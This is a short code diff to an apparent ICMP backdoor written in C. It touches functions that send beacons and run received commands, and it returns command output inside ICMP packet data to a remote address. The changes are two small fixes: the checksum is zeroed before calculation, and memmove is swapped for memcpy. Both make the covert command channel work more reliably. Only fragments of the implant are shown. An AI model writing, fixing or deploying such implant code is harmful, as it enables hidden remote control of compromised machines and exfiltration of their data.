@@ -117,6 +117,7 @@ int send_beacon(int sockfd, char *dst_ip) {
 	icmp->type = 8;
 	icmp->code = 8;
 	icmp->un.echo.id = 9001;
+    icmp->checksum = 0;
     icmp->checksum = cksum((unsigned short *) icmp, packet_size);
 
     bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr), 0, (struct sockaddr *) &dst, sizeof(dst));
@@ -187,7 +188,7 @@ void interact(int sockfd, char *dest_ip) {
         output_size = invoke_command(data, output);
 
         // put the output in the data section of the ICMP packet
-        memmove(data, output, output_size);
+        memcpy(data, output, output_size);
 
         // calculate the checksum
         icmp->checksum = 0; // needs to be set before calculating for some weird reason
